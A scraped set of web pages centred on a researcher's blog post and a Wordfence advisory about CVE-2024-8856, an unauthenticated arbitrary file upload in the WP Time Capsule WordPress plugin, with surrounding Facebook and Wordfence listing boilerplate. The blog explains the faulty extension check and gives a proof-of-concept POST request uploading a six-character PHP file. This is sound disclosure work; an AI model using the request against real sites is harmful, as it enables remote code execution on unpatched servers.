* [Română](https://ru-ru.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp- "Romanian")
* [Español](https://ro-ro.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp- "Spanish")
* [Français (France)](https://es-la.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp- "French (France)")
* [Deutsch](https://fr-fr.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp- "German")
* [Italiano](https://de-de.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp- "Italian")

* [Sign Up](/reg/ "Sign Up for Facebook")
* [Log In](/login/ "Log into Facebook")
* [Messenger](https://messenger.com/ "Check out Messenger.")
* [Facebook Lite](/lite/ "Facebook Lite for Android.")
* [Video](https://www.facebook.com/watch/ "Browse in Video")
* [Places](/places/ "Check out popular places on Facebook.")
* [Games](/games/ "Check out Facebook games.")
* [Marketplace](/marketplace/ "Buy and sell on Facebook Marketplace.")
* [Meta Pay](https://about.meta.com/technologies/meta-pay "Learn more about Meta Pay")
* [Meta Store](https://www.meta.com/ "Check out Meta")
* [Meta Quest](https://www.meta.com/quest/ "Learn more about Meta Quest")
* [Ray-Ban Meta](https://www.meta.com/smart-glasses/ "Learn more about Ray-Ban Meta")
* [Meta AI](https://www.meta.ai/ "Meta AI")
* [Instagram](https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&h=AT2AdySFVpyJLAGwLV706vI166FujlApt46uAbilOIgQDReq5VLVD-Z4W4M5tlbIpMeLOjbYUnMCY20FURwYkLg1p11MtuA-kgAer0l7G7yXGPUY8OMw-7kuJkE1e1eV6Bdsx55O3VWWxUjtIe1W6w "Check out Instagram")
* [Threads](https://www.threads.net/ "Check out Threads")
* [Fundraisers](/fundraisers/ "Donate to worthy causes.")
* [Services](/biz/directory/ "Browse our Facebook Services directory.")
* [Voting Information Center](/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D "See the Voting Information Center.")
* [Privacy Policy](/privacy/policy/?entry_point=facebook_page_footer "Learn how we collect, use and share information to support Facebook.")
* [Privacy Center](/privacy/center/?entry_point=facebook_page_footer "Learn how to manage and control your privacy on Facebook.")
* [Groups](/groups/discover/ "Explore our Groups.")
* [About](https://about.meta.com/ "Read our blog, discover the resource center, and find job opportunities.")
* [Create ad](/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto "Advertise on Facebook.")
* [Create Page](/pages/create/?ref_type=site_footer "Create a page")
* [Developers](https://developers.facebook.com/?ref=pf "Develop on our platform.")
* [Careers](/careers/?ref=pf "Make your next career move to our awesome company.")
* [Cookies](/policies/cookies/ "Learn about cookies and Facebook.")
* [Ad choices](https://www.facebook.com/help/568137493302217 "Learn about Ad Choices.")
* [Terms](/policies?ref=pf "Review our terms and policies.")
* [Help](/help/?ref=pf "Visit our Help Center.")
* [Contact Uploading & Non-Users](https://www.facebook.com/help/637205020878504 "Visit our Contact Uploading & Non-Users Notice.")
* [Settings](/settings "View and edit your Facebook settings.")
* [Activity log](/allactivity?privacy_source=activity_log_top_menu "View your activity log")
 Meta © 2025![](https://facebook.com/security/hsts-pixel.gif)



=== Content from www.wordfence.com_61df6ed9_20250115_193700.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

###### Top 10 Offending IPs from IP Threat Feed

Past 24 hours

| # | IP Address | Blocked Attacks |
| --- | --- | --- |
| 1 | 94.102.51.147 | 8,499,513 |
| 2 | 89.248.169.52 | 6,969,324 |
| 3 | 94.102.51.98 | 5,860,094 |
| 4 | 87.120.127.64 | 4,979,340 |
| 5 | 87.120.127.163 | 4,354,562 |
| 6 | 145.239.154.4 | 4,151,138 |
| 7 | 31.43.191.223 | 2,919,582 |
| 8 | 147.93.128.101 | 2,709,255 |
| 9 | 87.120.113.169 | 2,196,421 |
| 10 | 85.239.245.7 | 2,143,132 |

###### Top 5 Generic Vulnerabilities Blocked by Wordfence

Past 24 hours

| # | Vulnerability |
| --- | --- |
| 1 | [Directory Traversal via HTTP Headers](https://www.wordfence.com/threat-intel/vulnerabilities/detail/backup-migration-139-unauthenticated-path-traversal-to-arbitrary-file-deletion) |
| 2 | [Generic Object Injection](https://www.wordfence.com/threat-intel/protection/generic-object-injection) |
| 3 | [Stored Cross-Site Scripting via Shortcode](https://www.wordfence.com/threat-intel/protection/stored-cross-site-scripting-via-shortcode) |
| 4 | [WordPress Core < 6.3.2 - Authenticated (Subscriber+) Arbitrary Shortcode Execution](https://www.wordfence.com/threat-intel/vulnerabilities/detail/wordpress-core-632-authenticated-subscriber-arbitrary-shortcode-execution-via-parse-media-shortcode) |

###### Top 10 Unique WordPress Vulnerabilities Blocked by Wordfence

Past 24 hours

| # | Vulnerability |
| --- | --- |
| 1 | [LiteSpeed Cache <= 6.3.0.1 - Unauthenticated Privilege Escalation](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/litespeed-cache/litespeed-cache-6301-unauthenticated-privilege-escalation) |
| 2 | [WooCommerce Payments <= 5.6.1 Authentication Bypass and Privilege Escalation](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/woocommerce-payments/woocommerce-payments-561-authentication-bypass-and-privilege-escalation) |
| 3 | [POST SMTP Mailer – Email log, Delivery Failure Notifications and Best Mail SMTP for WordPress <= 2.8.6 - Authorization Bypass via type connect-app API](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/post-smtp/post-smtp-mailer-email-log-delivery-failure-notifications-and-best-mail-smtp-for-wordpress-287-authorization-bypass-via-type-connect-app-api) |
| 4 | [Hunk Companion <= 1.8.4 - Missing Authorization to Unauthenticated Arbitrary Plugin Installation/Activation](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/hunk-companion/hunk-companion-184-missing-authorization-to-unauthenticated-arbitrary-plugin-installationactivation) |
| 5 | [WAF-RULE-761](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/cleantalk-spam-protect/spam-protection-anti-spam-firewall-by-cleantalk-644-authorization-bypass-due-to-missing-empty-value-check-to-unauthenticated-arbitrary-plugin-installation) |
| 6 | [Sitemap by click5 <= 1.0.35 - Arbitrary Options Update](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/sitemap-by-click5/sitemap-by-click5-1035-arbitrary-options-update) |
| 7 | [HT Mega – Absolute Addons for Elementor <= 2.2.0 - Missing Authorization to Privilege Escalation](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/ht-mega-for-elementor/ht-mega-absolute-addons-for-elementor-220-missing-authorization-to-privilege-escalation) |
| 8 | [GutenKit <= 2.1.0 - Unauthenticated Arbitrary File Upload](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/gutenkit-blocks-addon/gutenkit-210-unauthenticated-arbitrary-file-upload) |
| 9 | [SEO Plugin by Squirrly SEO <= 12.1.20 - Missing Authorization](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/squirrly-seo/seo-plugin-by-squirrly-seo-12120-missing-authorization) |
| 10 | [WP Fastest Cache <= 1.1.2 - Missing Authorization](https://www.wordfence.com/threat-intel/protection/wp-fastest-cache-112-missing-authorization) |

## Search All Vulnerabilities

Search by name

Type
Any Type
Arbitrary File Upload
Authentication Bypass
Authorization Bypass
Brute Force
Cross-Site Request Forgery
CSV Injection
Cross-Site Scripting
Cryptographic Weakness
Denial of Service
Directory Traversal
Information Disclosure
Insecure Direct Object Reference
Object Injection
Open Redirect
Privilege Escalation
Remote Code Execution
Remote File Download
Remote File Inclusion
Server-Side Request Forgery
SQL Injection
Time of Check, Time of Use
XML Entity Expansion

CVSS Rating
Any Rating
Low
Medium
High
Critical

Month/Year
MM
Jan
Feb
Mar
Apr
May
Jun
Jul
Aug
Sep
Oct
Nov
Dec

Search

***Tip:** You can search by CVE ID, software name or slug, or the researcher name. Expand to read about more advanced search options.*

If you want to perform more advanced lookups, you can use **keywords** to further refine your search.

For example, `woocommerce researcher:"chloe chamberland"` would search for any vulnerabilities discovered by Chloe Chamberland in software that has WooCommerce in the title.

Keywords are added in `keyword:value` format. If the value contains spaces, you must enclose it in quotation marks.

You can use the following keywords to add criteria to your search:

title
Searches through the title of each vulnerability for matches.

date
Returns vulnerabilities by publication date. Use `YYYY-MM-DD`, `YYYY-MM` or `YYYY` format.

cvss-rating
Use `low`, `medium`, `high` or `critical` to limit the search to vulnerabilities with the specified rating.

researcher
Returns vulnerabilities credited to researchers containing the given text.

software
Returns vulnerabilities discovered in software containing the given text.

software-slug
Returns vulnerabilities discovered in software exactly matching the given slug.

software-type
Use `plugin`, `theme` or `core` to limit the search to the specified type of software.

By selecting “Search” you acknowledge that you have read and agree to the Wordfence Intelligence Terms and Conditions.

## Recently Added Vulnerabilities

Submit Vulnerability
View All

[WP User Profile Avatar <= 1.0.5 - Cross-Site Request Forgery to Settings Update](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-user-profile-avatar/wp-user-profile-avatar-105-cross-site-request-forgery-to-settings-update)

4.3

[CVE-2024-10789](https://www.cve.org/CVERecord?id=CVE-2024-10789)

Jan 15, 2025

**Researcher:**
[yudha](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/yudha)

[Motors – Car Dealer, Classifieds & Listing <= 1.4.43 - Authenticated (Subscriber+) Arbitrary Shortcode Execution via Custom Title](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/motors-car-dealership-classified-listings/motors-car-dealer-classifieds-listing-1443-authenticated-subscriber-arbitrary-shortcode-execution-via-custom-title)

5.4

[CVE-2024-10970](https://www.cve.org/CVERecord?id=CVE-2024-10970)

Jan 15, 2025

**Researchers:**
[ghsinfosec](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/ghsinfosec), [C\_T\_R\_L](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/chance-kelly)

[UpdraftPlus - Backup/Restore <= 1.24.12 - Reflected Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/updraftplus/updraftplus-backuprestore-12412-reflected-cross-site-scripting)

6.1

[CVE-2025-0215](https://www.cve.org/CVERecord?id=CVE-2025-0215)

Jan 15, 2025

**Researcher:**
[Asaf Mozes](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/asaf-mozes)

[DWT - Directory & Listing WordPress Theme <= 3.3.3 - Reflected Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-themes/dwt-listing-2/dwt-directory-listing-wordpress-theme-333-reflected-cross-site-scripting)

6.1

[CVE-2025-0170](https://www.cve.org/CVERecord?id=CVE-2025-0170)

Jan 15, 2025

**Researcher:**
[István Márton](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/lana-codes)

[Chamber Dashboard Business Directory <= 3.3.8 - Authenticated (Contributor+) Stored Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/chamber-dashboard-business-directory/chamber-dashboard-business-directory-338-authenticated-contributor-stored-cross-site-scripting)

6.4

[CVE-2024-11452](https://www.cve.org/CVERecord?id=CVE-2024-11452)

Jan 15, 2025

**Researcher:**
[Peter Thaleikis](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/spek)

[PDF for WPForms + Drag and Drop Template Builder <= 4.6.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via yeepdf\_dotab Shortcode](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/pdf-for-wpforms/pdf-for-wpforms-drag-and-drop-template-builder-460-authenticated-contributor-stored-cross-site-scripting-via-yeepdf-dotab-shortcode)

6.4

[CVE-2024-12593](https://www.cve.org/CVERecord?id=CVE-2024-12593)

Jan 14, 2025

**Researcher:**
[SOPROBRO](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/soprobro-2)

[Post Grid and Gutenberg Blocks 2.2.85 - 2.3.3 - Unauthenticated Privilege Escalation](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/post-grid/post-grid-and-gutenberg-blocks-2285-233-unauthenticated-privilege-escalation)

9.8

[CVE-2024-9636](https://www.cve.org/CVERecord?id=CVE-2024-9636)

Jan 14, 2025

**Researcher:**
[wesley (wcraft)](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/wesley-jhon)

[Social proof testimonials and reviews by Repuso <= 5.20 - Authenticated (Contributor+) Stored Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/social-testimonials-and-reviews-widget/social-proof-testimonials-and-reviews-by-repuso-520-authenticated-contributor-stored-cross-site-scripting)

7.2

[CVE-2024-13351](https://www.cve.org/CVERecord?id=CVE-2024-13351)

Jan 14, 2025

**Researcher:**
[zaim](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/zaim)

[Piotnet Addons For Elementor <= 2.4.32 - Authenticated (Contributor+) Post Disclosure](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/piotnet-addons-for-elementor/piotnet-addons-for-elementor-2432-authenticated-contributor-post-disclosure)

4.3

[CVE-2024-10775](https://www.cve.org/CVERecord?id=CVE-2024-10775)

Jan 14, 2025

**Researcher:**
[Francesco Carlucci](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/francesco-carlucci)

[Event Registration Calendar By vcita <= 1.4.0 - Authenticated (Contributor+) Stored Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/event-registration-calendar-by-vcita/event-registration-calendar-by-vcita-140-authenticated-contributor-stored-cross-site-scripting)

6.4

[CVE-2024-11870](https://www.cve.org/CVERecord?id=CVE-2024-11870)

Jan 14, 2025

**Researcher:**
[yudha](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/yudha)

| # | Title | CVE ID | CVSS | Researchers | Date |
| --- | --- | --- | --- | --- | --- |
| 1 | [WP User Profile Avatar <= 1.0.5 - Cross-Site Request Forgery to Settings Update](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-user-profile-avatar/wp-user-profile-avatar-105-cross-site-request-forgery-to-settings-update) | [CVE-2024-10789](https://www.cve.org/CVERecord?id=CVE-2024-10789) | 4.3 | [yudha](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/yudha) | January 15, 2025 |
| 2 | [Motors – Car Dealer, Classifieds & Listing <= 1.4.43 - Authenticated (Subscriber+) Arbitrary Shortcode Execution via Custom Title](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/motors-car-dealership-classified-listings/motors-car-dealer-classifieds-listing-1443-authenticated-subscriber-arbitrary-shortcode-execution-via-custom-title) | [CVE-2024-10970](https://www.cve.org/CVERecord?id=CVE-2024-10970) | 5.4 | [ghsinfosec](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/ghsinfosec), [C\_T\_R\_L](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/chance-kelly) | January 15, 2025 |
| 3 | [UpdraftPlus - Backup/Restore <= 1.24.12 - Reflected Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/updraftplus/updraftplus-backuprestore-12412-reflected-cross-site-scripting) | [CVE-2025-0215](https://www.cve.org/CVERecord?id=CVE-2025-0215) | 6.1 | [Asaf Mozes](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/asaf-mozes) | January 15, 2025 |
| 4 | [DWT - Directory & Listing WordPress Theme <= 3.3.3 - Reflected Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-themes/dwt-listing-2/dwt-directory-listing-wordpress-theme-333-reflected-cross-site-scripting) | [CVE-2025-0170](https://www.cve.org/CVERecord?id=CVE-2025-0170) | 6.1 | [István Márton](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/lana-codes) | January 15, 2025 |
| 5 | [Chamber Dashboard Business Directory <= 3.3.8 - Authenticated (Contributor+) Stored Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/chamber-dashboard-business-directory/chamber-dashboard-business-directory-338-authenticated-contributor-stored-cross-site-scripting) | [CVE-2024-11452](https://www.cve.org/CVERecord?id=CVE-2024-11452) | 6.4 | [Peter Thaleikis](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/spek) | January 15, 2025 |
| 6 | [PDF for WPForms + Drag and Drop Template Builder <= 4.6.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via yeepdf\_dotab Shortcode](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/pdf-for-wpforms/pdf-for-wpforms-drag-and-drop-template-builder-460-authenticated-contributor-stored-cross-site-scripting-via-yeepdf-dotab-shortcode) | [CVE-2024-12593](https://www.cve.org/CVERecord?id=CVE-2024-12593) | 6.4 | [SOPROBRO](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/soprobro-2) | January 14, 2025 |
| 7 | [Post Grid and Gutenberg Blocks 2.2.85 - 2.3.3 - Unauthenticated Privilege Escalation](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/post-grid/post-grid-and-gutenberg-blocks-2285-233-unauthenticated-privilege-escalation) | [CVE-2024-9636](https://www.cve.org/CVERecord?id=CVE-2024-9636) | 9.8 | [wesley (wcraft)](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/wesley-jhon) | January 14, 2025 |
| 8 | [Social proof testimonials and reviews by Repuso <= 5.20 - Authenticated (Contributor+) Stored Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/social-testimonials-and-reviews-widget/social-proof-testimonials-and-reviews-by-repuso-520-authenticated-contributor-stored-cross-site-scripting) | [CVE-2024-13351](https://www.cve.org/CVERecord?id=CVE-2024-13351) | 7.2 | [zaim](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/zaim) | January 14, 2025 |
| 9 | [Piotnet Addons For Elementor <= 2.4.32 - Authenticated (Contributor+) Post Disclosure](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/piotnet-addons-for-elementor/piotnet-addons-for-elementor-2432-authenticated-contributor-post-disclosure) | [CVE-2024-10775](https://www.cve.org/CVERecord?id=CVE-2024-10775) | 4.3 | [Francesco Carlucci](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/francesco-carlucci) | January 14, 2025 |
| 10 | [Event Registration Calendar By vcita <= 1.4.0 - Authenticated (Contributor+) Stored Cross-Site Scripting](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/event-registration-calendar-by-vcita/event-registration-calendar-by-vcita-140-authenticated-contributor-stored-cross-site-scripting) | [CVE-2024-11870](https://www.cve.org/CVERecord?id=CVE-2024-11870) | 6.4 | [yudha](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/yudha) | January 14, 2025 |

Submit Vulnerability

## Researcher Hall of Fame (Past 30 days)

[View All](https://www.wordfence.com/threat-intel/vulnerabilities/researchers)

| Rank | Name | Vulnerabilities since Dec 16, 2024  Vulns |
| --- | --- | --- |
| 1 | [SOPROBRO](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/soprobro-2) | 81 |
| 2 | [vgo0](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/dale-mavers) | 52 |
| 3 | [João Pedro Soares de Alcântara](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/joao-pedro-soares-de-alcantara) | 48 |
| 4 | [Rafie Muhammad](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/rafie-muhammad) | 34 |
| 5 | [Peter Thaleikis](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/spek) | 30 |
| 6 | [Mika](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/mika) | 27 |
| 7 | [Lucio Sá](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/lucio-sa) | 26 |
| 8 | [zaim](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/zaim) | 20 |
| 9 | [Francesco Carlucci](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/francesco-carlucci) | 18 |
| 10 | [0xd4rk5id3](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/0xd4rk5id3) | 17 |

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from hacked.be_6b5490e8_20250115_193701.html ===

## [Hacked.be](/)

# CVE-2024-8856 - Unauthenticated RCE via Arbitrary File Upload

![Rein Daelman](/assets/blog/authors/rein.jpeg)Rein Daelman![Cover Image for CVE-2024-8856 - Unauthenticated RCE via Arbitrary File Upload](/_next/image?url=%2Fassets%2Fblog%2Fimages%2FCVE-2024-8856.webp&w=3840&q=75)![Rein Daelman](/assets/blog/authors/rein.jpeg)Rein DaelmanNovember 20, 2024

Hello all! Welcome to my very first blogpost. Today, I wanted to talk about CVE-2024-8856, a critical vulnerability I found and reported through [WordFence](https://www.wordfence.com/). The issue was found in the [WP Time Capsule](https://wordpress.org/plugins/wp-time-capsule/) plugin, which has over 20,000 active installations.

## CVE-2024-8856

* **CVSSv3:** 9.8 Critical
* **Affected Version:** <= 1.22.21
* **Links:** [WordFence](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-time-capsule/backup-and-staging-by-wp-time-capsule-12221-unauthenticated-arbitrary-file-upload) / [CVE.org](https://www.cve.org/CVERecord?id=CVE-2024-8856) / [NIST](https://nvd.nist.gov/vuln/detail/CVE-2024-8856)

## Recon

If there is one thing I enjoy, it is white-box targets. As WordFence was doing a bug bounty promotion, which included all WordPress plugins/themes with >1000 active installations, my interest was piqued. I started off by downloading a couple plugins and started "grepping".

I decided to look for upload functionality, to check the file type validation. Regexes like `wp_ajax_nopriv.*upload`, `move_uploaded_file` and others (can't recall which one it actually was) eventually led me to [UploadHandler.php](https://plugins.trac.wordpress.org/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?rev=2947098&order=name). In this file, POST requests are handled via the `post()` function, which in turn calls `handle_file_upload()`. In there, the `validate()` function handles validation (length, size, type, etc.).

## The vulnerable function

In the `validate()` function, after some uninteresting length/size checks, we find the file type validation:

```
$allowed_extensions = array('.sql', '.gz', '.crypt');

$found = false;

foreach ($allowed_extensions as $extension) {

	if(strrpos($file->name, $extension) + strlen($extension) === strlen($file->name)){
		$found = true;
	}
}

```

This raised some red flags immediately, do you see the issue here?

Foreach loops over the `$allowed_extensions` whitelist. The `strrpos` function is used to get the position of the last occurrence of the extension. After, the length of the extension is added (`strlen`). This sum is then checked against the length of the entire filename.

As an example, if we were to upload `poc.sql`, the if statement would become:

```
if(strrpos('poc.sql', '.sql') + strlen('.sql') === strlen('poc.sql'))

```

Or:

```
if(3 + 4 === 7)

```

What is the issue? If an extension is not present in the `$allowed_extensions`whitelist, the `strrpos` function returns 0. This means that throughout the foreach loop we would get the following:

* `if(0 + 4 === strlen($file->name))` - for .sql
* `if(0 + 3 === strlen($file->name))` - for .gz
* `if(0 + 6 === strlen($file->name))` - for .crypt

Because of this, we can upload any 3, 4 or 6 character filenames. To upload a PHP shell, you could simply upload `00.php`. The if statement would become:

```
if(strrpos('00.php', '.crypt') + strlen('.crypt') === strlen('00.php'))

```

Or:

```
if(0 + 6 === 6)

```
## Proof of Concept (PoC)

Send the following POST request (note the 6 character filename):

```
POST /wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/index.php HTTP/2
Host: localhost
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=---------------------------26670583928903275361770089688
Content-Length: 540

-----------------------------26670583928903275361770089688
Content-Disposition: form-data; name="files"; filename="00.php"
Content-Type: text/php

<?php phpinfo(); ?>
-----------------------------26670583928903275361770089688--

```
## Limitations

This issue is not always exploitable. The reason for this is that an `index.php` file needs to be present in the `/wp-tcapsule-bridge/upload/php/` directory. This file is created via the `prepare_file_upload_index_file_wptc` action, which is triggered by clicking the "Click here to show upload options" button in the settings.

## Conclusion

Do not use the combination of `strrpos` and `strlen` to validate filetypes.

## Timeline

* **13th of september - 18:51** > Report submitted to WordFence
* **13th of september - 21:08** > Validated and assigned a CVE
* **13th of september - 21:30** > Bounty of $975 awarded
* **17th of september** > Issue fixed in 1.22.22
* **15th of november** > CVE published

I would like to thank WordFence for the quick triage and bounty!

[Twitter / X](https://x.com/ReinDaelman)[LinkedIn](https://www.linkedin.com/in/rein-daelman/)[Hackerone](https://hackerone.com/trein)[Bugcrowd](https://bugcrowd.com/trein)

Blog created using the [Vercel Blog Starter Kit](https://vercel.com/templates/next.js/blog-starter-kit).



=== Content from www.wordfence.com_88c3ffa0_20250114_220907.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# Backup and Staging by WP Time Capsule <= 1.22.21 - Unauthenticated Arbitrary File Upload

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   Backup and Staging by WP Time Capsule <= 1.22.21 - Unauthenticated Arbitrary File Upload

9.8

**Unrestricted Upload of File with Dangerous Type**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

| CVE | [CVE-2024-8856](https://www.cve.org/CVERecord?id=CVE-2024-8856) |
| --- | --- |
| CVSS | 9.8 (Critical) |
| Publicly Published | November 15, 2024 |
| Last Updated | November 21, 2024 |
| Researcher | [Rein Daelman (trein)](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/rein-daelman) |

### Description

The Backup and Staging by WP Time Capsule plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the the UploadHandler.php file and no direct file access prevention in all versions up to, and including, 1.22.21. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset/3188325/)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=3153289%40wp-time-capsule&new=3153289%40wp-time-capsule&sfp_email=&sfph_mail=)
* [hacked.be](https://hacked.be/posts/CVE-2024-8856)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp-time-capsule-12221-unauthenticated-arbitrary-file-upload&t=Backup%20and%20Staging%20by%20WP%20Time%20Capsule%20%3C%3D%201.22.21%20-%20Unauthenticated%20Arbitrary%20File%20Upload "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp-time-capsule-12221-unauthenticated-arbitrary-file-upload&text=Backup%20and%20Staging%20by%20WP%20Time%20Capsule%20%3C%3D%201.22.21%20-%20Unauthenticated%20Arbitrary%20File%20Upload "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp-time-capsule-12221-unauthenticated-arbitrary-file-upload "LinkedIn")
Email

## Vulnerability Details for Backup and Staging by WP Time Capsule

#### [Backup and Staging by WP Time Capsule](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-time-capsule)

| Software Type | Plugin |
| --- | --- |
